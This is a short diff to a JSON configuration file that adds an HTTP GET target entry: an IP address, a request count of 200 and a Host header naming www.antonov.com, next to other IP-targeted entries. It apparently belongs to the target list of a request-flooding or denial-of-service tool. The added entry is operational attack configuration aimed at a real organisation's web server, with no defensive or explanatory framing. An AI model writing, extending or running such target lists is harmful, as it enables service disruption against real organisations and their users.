@@ -30,6 +30,15 @@
       },
       {
         "type": "HTTP",
+        "count": 200,
+        "method": "GET",
+        "path": "https://185.239.185.38/en?lang=ua",
+        "header": {
+          "Host": "www.antonov.com"
+        }
+      },
+      {
+        "type": "HTTP",
         "count": 400,
         "method": "GET",
         "path": "https://89.184.95.76/",
